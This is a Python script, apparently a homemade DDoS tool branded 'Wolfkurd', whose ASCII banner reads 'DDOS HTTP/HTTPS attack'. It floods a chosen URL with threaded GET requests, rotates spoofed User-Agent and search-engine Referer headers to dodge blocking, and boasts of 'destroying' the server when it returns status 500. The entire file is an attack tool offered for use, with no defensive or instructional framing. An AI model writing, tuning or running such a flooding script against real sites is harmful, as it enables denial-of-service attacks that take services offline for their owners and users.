import random
import requests
import concurrent.futures


url = ""  # The URL you want to target
num_requests = 10  # Number of requests
max_threads = 10  # Maximum threads

# Wolfkurd's personal touch
ascii_art = """

                 _   __  _                     _                                                                            
                | | / _|| |                   | |                                                                           
__      __ ___  | || |_ | | __ _   _  _ __  __| |                                                                           
\ \ /\ / // _ \ | ||  _|| |/ /| | | || '__|/ _` |                                                                           
 \ V  V /| (_) || || |  |   < | |_| || |  | (_| |                                                                           
  \_/\_/  \___/ |_||_|  |_|\_\ \__,_||_|   \__,_|                                                                           
______ ______  _____  _____   _   _  _    _              __ _   _  _    _                        _    _                _    
|  _  \|  _  \|  _  |/  ___| | | | || |  | |            / /| | | || |  | |                      | |  | |              | |   
| | | || | | || | | |\ `--.  | |_| || |_ | |_  _ __    / / | |_| || |_ | |_  _ __   ___    __ _ | |_ | |_  __ _   ___ | | __
| | | || | | || | | | `--. \ |  _  || __|| __|| '_ \  / /  |  _  || __|| __|| '_ \ / __|  / _` || __|| __|/ _` | / __|| |/ /
| |/ / | |/ / \ \_/ //\__/ / | | | || |_ | |_ | |_) |/ /   | | | || |_ | |_ | |_) |\__ \ | (_| || |_ | |_| (_| || (__ |   < 
|___/  |___/   \___/ \____/  \_| |_/ \__| \__|| .__//_/    \_| |_/ \__| \__|| .__/ |___/  \__,_| \__| \__|\__,_| \___||_|\_\
                                              | |                           | |                                             
                                              |_|                           |_|                                             

"""
print(ascii_art)
print("Wolfkurd is here... prepare yourself! 🚀")

headers_useragents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0'
]

headers_referers = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://www.yahoo.com'
]

def send_request(url):
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': random.choice(headers_referers)
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 500:
            print(f"💥 Wolfkurd destroyed the server! Status code 500. Server crashed! 💥")
        elif response.status_code == 403:
            print(f"🚫 403 Blocked! Wolfkurd was too strong for you. Try again... maybe not. 🚫")
        elif response.status_code != 200:
            print(f"⚡ Unexpected response code {response.status_code} from {url}. Something went wrong... ⚡")
    except requests.exceptions.RequestException as e:
        print(f"💣 Wolfkurd's wrath failed! Error while sending request: {e} 💣")

def main():
    print("🔥 Starting the onslaught... 🔥")
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(send_request, url) for _ in range(num_requests)]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"⚠️ Oops! Something exploded. An error occurred: {e} ⚠️")

if __name__ == '__main__':
    main()
